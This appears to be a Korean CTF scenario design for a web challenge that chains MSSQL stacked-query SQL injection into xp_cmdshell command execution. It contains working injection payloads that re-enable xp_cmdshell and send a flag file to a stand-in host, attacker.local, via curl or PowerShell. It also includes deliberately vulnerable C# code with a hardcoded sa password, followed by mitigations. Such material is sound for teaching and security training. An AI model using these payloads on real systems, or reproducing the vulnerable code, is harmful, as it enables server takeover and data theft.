---
title: MSSQL Stacked Queries and xp_cmdshell RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, sqli, mssql, stacked-queries, xp_cmdshell, rce, database]
confidence: high
---

# MSSQL Stacked Queries and xp_cmdshell RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Legacy Inventory Viewer (레거시 재고 검색기)
- **난이도**: High
- **핵심 컨셉**: ASP.NET 및 Microsoft SQL Server (MSSQL) 레거시 스택 환경에서 발생하는 SQL 인젝션 취약점이 다중 쿼리 실행 제어와 결합하여 발생하는 **MSSQL Stacked Queries 및 xp_cmdshell RCE** 취약점 문제입니다. 대상 애플리케이션은 재고 정보를 검색하는 기능에서 사용자 입력값을 매개변수화하지 않고 직접 문자열에 연결해 질의를 조립합니다. 또한, 연동된 DB 드라이버 환경이 세미콜론(;)을 이용한 다중 구문 실행(Stacked Queries)을 지원합니다. 공격자는 단순 데이터 조회를 넘어 세미콜론으로 기존 SELECT 문을 닫은 뒤, MSSQL 내부의 위험한 확장 프로시저인 **`xp_cmdshell`**을 임시 활성화하고 OS 명령어를 직접 구동시켜 시스템 제어권을 확보합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Inventory Search API (`/Search.aspx`)**:
  - ASP.NET 환경의 재고 물품 검색 페이지.
  - 입력값 `search_term` 변수를 통해 MSSQL에 동적 쿼리 전송.
- **MSSQL Database Instance**:
  - `sa` (System Administrator) 등 높은 권한의 DB 계정으로 애플리케이션이 연동되어 있어 시스템 구성(Configuration) 변경 가능.
- **Flag 위치**:
  - 서버 운영체제 C드라이브 또는 리눅스 파일 시스템 루트 경로 `/flag.txt`에 탑재되어 있어 RCE를 통해 탈취해야 합니다.

### 2.2 취약점 지점
1. **Stacked Queries Support (다중 쿼리 지원)**:
   - PHP/MySQL 등 일부 환경과 달리, MSSQL과 특정 .NET DB 어댑터 조합은 단일 데이터베이스 연결 트랜잭션에서 세미콜론으로 분리된 여러 SQL 구문들을 차례대로 동시 처리해 주는 특성이 있어 공격자가 새로운 DDL/DML 및 EXEC 문을 덧붙일 수 있습니다.
2. **Abuse of `xp_cmdshell` Extended Stored Procedure**:
   - `xp_cmdshell`은 MSSQL에서 데이터베이스의 인수로 OS 쉘 명령을 구동시키는 확장 프로시저입니다.
   - 기본적으로 보안 위협을 막기 위해 비활성화(Disabled)되어 있으나, 데이터베이스 관리 권한(`sa`)을 쥔 상태에서 Stacked SQLi가 터지면 `sp_configure` 프로시저를 동적으로 주입 호출하여 이를 강제 재활성화할 수 있습니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 데이터베이스 권한 요구 조건 | 역할 |
|------------|--------|------|----------|------------------------------|------|
| `/Search.aspx` | GET | 불필요 | `term` | `sa` (Admin 권한 연동 필수) | Stacked SQLi 및 xp_cmdshell 활성화 유발점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. SQL 인젝션 식별 및 Stacked Query 가능 여부 검증
1. 재고 검색창 파라미터에 싱글 쿼터 `'`를 삽입하여 SQL 에러가 노출되는지 체크합니다.
   `term=test'`
2. 세미콜론`;` 기호와 함께 임의의 지연 쿼리(Time-based)를 다중 작성하여 실행 시간이 지연되는지 진단합니다.
   `term=test'; WAITFOR DELAY '0:0:5' --`
3. 서버가 약 5초 후에 응답을 반환하는 것을 보고 다중 쿼리(Stacked Queries) 구동이 완벽히 허용됨을 확인합니다.

### Step 2. xp_cmdshell 강제 재활성화
기본적으로 꺼져 있는 시스템 확장 기능을 다시 켜기 위해 `sp_configure` 설정 변경 쿼리를 Stacked 방식으로 연달아 실행합니다.
- **주입할 구성 변경 SQL 구문**:
  ```sql
  -- 고급 옵션을 볼 수 있게 허용
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  -- xp_cmdshell 활성화
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  ```
- **실제 주입 파라미터**:
  `term=test'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --`

### Step 3. OS 명령어 주입 및 데이터 exfiltration
기능이 활성화되었으므로 `xp_cmdshell` 프로시저를 이용하여 공격자 리시버로 플래그 파일을 전송하는 OS 커맨드를 실행시킵니다.
- **주입할 명령어**:
  `EXEC xp_cmdshell 'curl http://attacker.local/log?c=$(cat /flag.txt)';`
  *(윈도우 서버일 경우: `EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.local/log?c=$(Get-Content C:\flag.txt)"';`)*
- **최종 전송 파라미터**:
  `term=test'; EXEC xp_cmdshell 'curl http://attacker.local/log?c=$(cat /flag.txt)'; --`

### Step 4. flag 획득
1. 조작된 요청을 `/Search.aspx`로 발송합니다.
2. MSSQL 엔진은 Stacked 구문을 차례대로 소화하여:
   1. 기존 SELECT 재고 조회를 마칩니다.
   2. `xp_cmdshell`을 실행하여 쉘에서 `curl` 또는 `powershell` 명령을 실행합니다.
3. 공격자의 로그 리시버 웹로그에 플래그 파일 본문인 `FLAG{mssql_stacked_query_xp_cmdshell_rce_success}`가 수신되어 플래그를 취득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (C# ASP.NET)

```csharp
// Search.aspx.cs (취약한 ASP.NET 백엔드 C# 소스 예시)
using System;
using System.Data;
using System.Data.SqlClient;
using System.Web.UI;

public partial class Search : Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        string searchTerm = Request.QueryString["term"];
        if (string.IsNullOrEmpty(searchTerm)) return;

        // 취약점 지점 1: sa(System Administrator) 권한으로 설정된 위험한 연결 문자열
        string connStr = "Server=localhost;Database=inventory;User Id=sa;Password=SA_Password123!;";
        
        using (SqlConnection conn = new SqlConnection(connStr))
        {
            conn.Open();
            
            // 취약점 지점 2: 매개변수 바인딩(@term) 없이 문자열 결합으로 동적 SQL 쿼리를 구성함
            // SqlDataAdapter는 내부적으로 세미콜론(;)을 이용한 다중 쿼리(Stacked Queries) 수행을 허용합니다.
            string query = "SELECT id, item_name, quantity FROM products WHERE item_name LIKE '%" + searchTerm + "%'";
            
            using (SqlCommand cmd = new SqlCommand(query, conn))
            {
                SqlDataAdapter adapter = new SqlDataAdapter(cmd);
                DataTable dt = new DataTable();
                adapter.Fill(dt); // 이 시점에 다중 쿼리가 순차적으로 실행됨
                
                GridViewResult.DataSource = dt;
                GridViewResult.DataBind();
            }
        }
    }
}
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **파라미터화된 쿼리 도입 (Parameterized Queries)**:
   - 사용자의 모든 입력을 SQL 구문 빌드와 완벽 분리하여 인자로 대입하는 파라미터화된 쿼리 또는 Entity Framework 등의 안전한 ORM 기술을 사용합니다.
     ```csharp
     // 안전한 쿼리 빌드 예시
     string query = "SELECT id, item_name, quantity FROM products WHERE item_name LIKE @term";
     SqlCommand cmd = new SqlCommand(query, conn);
     cmd.Parameters.AddWithValue("@term", "%" + searchTerm + "%");
     ```
2. **최소 권한의 법칙 준수 (Principle of Least Privilege)**:
   - 웹 애플리케이션 서비스용 DB 커넥션 계정을 `sa`가 아닌, 오직 특정 테이블에 대한 SELECT, INSERT 권한만 가지는 전용 저권한 계정(예: `web_user`)으로 한정하여, 침투 시에도 `sp_configure`나 `xp_cmdshell` 실행 자체가 권한 거부(Permission Denied)되도록 설정합니다.
3. **`xp_cmdshell` 프로시저의 물리적 완전 제거**:
   - 데이터베이스 서버의 안전을 위해 `xp_cmdshell` 확장 옵션 모듈을 구성 요소에서 완전히 제거하거나 레지스트리 설정 단에서 영구 금지 처리합니다.
